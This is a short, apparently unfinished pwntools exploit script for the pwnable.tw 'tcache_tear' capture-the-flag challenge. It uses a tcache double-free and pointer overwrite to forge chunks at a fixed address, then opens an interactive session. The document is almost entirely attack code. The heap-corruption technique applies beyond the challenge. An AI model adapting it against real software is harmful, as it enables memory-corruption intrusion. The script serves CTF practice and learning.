#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('tcache_tear')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10207)

env = {'LD_PRELOAD':'./libc.so'}
env={}

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def snd(p, s):
    io.sendafter(str(p), str(s))

def sndp(s):
    snd(':', s)

def malloc(sz, data):
    sndp(1)
    sndp(sz)
    sndp(data)

def free():
    sndp(2)

def info():
    sndp(3)

context.terminal = ['tmux', 'split', '-h']
io = start()

if args.GDB:
    io.recv()

chunks = ""
base_addr = 0x602060
for i in range(3):
    chunks += p64(base_addr+(i+1)*8)

sndp(chunks)

malloc(0x5, "A")
free()
malloc(0x80, "B")
free()

malloc(0x5, "a" * 32 + p64(base_addr))
malloc(0x80, "A")
free()

io.interactive()

